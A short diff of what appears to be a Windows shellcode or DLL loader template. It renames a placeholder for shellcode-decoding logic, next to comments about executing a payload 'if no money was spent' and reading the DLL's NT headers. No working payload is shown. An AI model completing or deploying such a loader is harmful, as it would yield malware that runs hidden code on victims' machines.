@@ -105,8 +105,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
 
         // Execute payload if no money was spent
         // Step 0 : Decode the payload
-        %SHELLCODE_DECODER% // Placeholder for shellcode decoding logic
-        /*-SHELLCODE_DECODER-*/
+        %__SHELLCODE_DECODER__% // Placeholder for shellcode decoding logic
         // Step 1 : Get DLL's NT headers
 
         PIMAGE_NT_HEADERS64 dll_htHeaders = PE_getNtheaders(payload);
